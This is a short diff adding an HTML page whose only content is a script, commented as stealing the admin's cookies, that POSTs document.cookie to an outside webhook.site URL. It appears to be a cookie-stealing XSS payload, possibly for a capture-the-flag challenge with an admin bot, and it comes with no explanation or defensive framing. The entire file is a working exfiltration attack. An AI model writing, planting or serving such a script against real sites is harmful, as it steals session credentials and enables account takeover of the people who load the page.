@@ -1,0 +1,12 @@
+<html>
+  <body>
+    <script>
+      // Steal admin's cookies and send to your webhook
+      fetch("https://webhook.site/92ccd626-bea2-4614-b19e-73a72927b9e9", {
+        method: "POST",
+        mode: "no-cors",
+        body: document.cookie
+      });
+    </script>
+  </body>
+</html>
